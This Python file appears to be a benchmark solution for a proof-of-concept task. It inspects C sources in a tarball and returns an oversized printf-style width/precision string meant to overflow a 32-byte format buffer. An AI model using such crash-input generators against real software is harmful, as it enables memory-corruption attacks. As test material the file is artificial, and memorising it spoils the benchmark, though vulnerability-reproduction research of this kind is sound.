import os
import re
import tarfile
from typing import List, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        width = "1000000000000000"      # 16 digits
        prec = "1000000000000000"       # 16 digits

        cand_full = (f"%{width}.{prec}d").encode("ascii")   # 35 bytes
        cand_dot = (f"{width}.{prec}").encode("ascii")      # 33 bytes
        cand_space = (f"{width} {prec}").encode("ascii")    # 33 bytes

        try:
            contents: List[Tuple[str, str]] = []
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp") or name.endswith(".h") or name.endswith(".hpp")):
                        continue
                    if m.size <= 0 or m.size > 2_000_000:
                        continue
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                    if b"\x00" in data[:4096]:
                        continue
                    text = data.decode("utf-8", "ignore")
                    contents.append((m.name, text))
        except Exception:
            return cand_full

        if not contents:
            return cand_full

        re_sscanf = re.compile(r'\bsscanf\s*\([^;]*,\s*"((?:[^"\\]|\\.)*)"')
        re_fscanf = re.compile(r'\bfscanf\s*\([^;]*,\s*"((?:[^"\\]|\\.)*)"')
        re_check_percent = re.compile(r"(?:\[\s*0\s*\]\s*==\s*'%')|(?:\*\s*\w+\s*==\s*'%')|(?:==\s*'%'\s*)")
        re_strchr_percent = re.compile(r"\bstrchr\s*\(\s*[^,]+,\s*'%'\s*\)")
        re_strchr_dot = re.compile(r"\bstrchr\s*\(\s*[^,]+,\s*'\.'\s*\)")
        re_fmt32 = re.compile(r"\bchar\s+\w+\s*\[\s*32\s*\]")
        re_sprintf = re.compile(r"\b(?:sprintf|vsprintf)\s*\(")
        re_snprintf = re.compile(r"\b(?:snprintf|vsnprintf)\s*\(")

        percent_expected_score = 0
        dotsep_score = 0
        spacesep_score = 0

        def analyze_scanf_fmt(fmt: str) -> None:
            nonlocal percent_expected_score, dotsep_score, spacesep_score
            if "%%" in fmt:
                percent_expected_score += 3

            perc_positions = [i for i, ch in enumerate(fmt) if ch == "%"]
            if len(perc_positions) >= 2:
                p1, p2 = perc_positions[0], perc_positions[1]
                between = fmt[p1:p2]
                if "." in between:
                    dotsep_score += 2
                # if whitespace literal appears between conversions
                if re.search(r"\s", between):
                    spacesep_score += 2

            if re.search(r"%[^%]*\.[^%]*%", fmt):
                dotsep_score += 2
            if re.search(r"%[^%]*[ \t\r\n]+[^%]*%", fmt):
                spacesep_score += 2

        for _, text in contents:
            tl = text.lower()
            relevance = 0
            for kw in ("precision", "width", "format", "fmt", "printf"):
                if kw in tl:
                    relevance += 1
            if re_fmt32.search(text):
                relevance += 2
            if re_sprintf.search(text) and ("format" in tl or "fmt" in tl):
                relevance += 1
            if re_snprintf.search(text) and ("format" in tl or "fmt" in tl):
                relevance += 1

            if relevance < 2:
                continue

            if re_check_percent.search(text) or re_strchr_percent.search(text):
                percent_expected_score += 2
            if re_strchr_dot.search(text):
                dotsep_score += 1

            for m in re_sscanf.finditer(text):
                analyze_scanf_fmt(m.group(1))
            for m in re_fscanf.finditer(text):
                analyze_scanf_fmt(m.group(1))

        if percent_expected_score > max(dotsep_score, spacesep_score):
            return cand_full
        if dotsep_score >= spacesep_score and dotsep_score > 0:
            return cand_dot
        if spacesep_score > 0:
            return cand_space
        return cand_full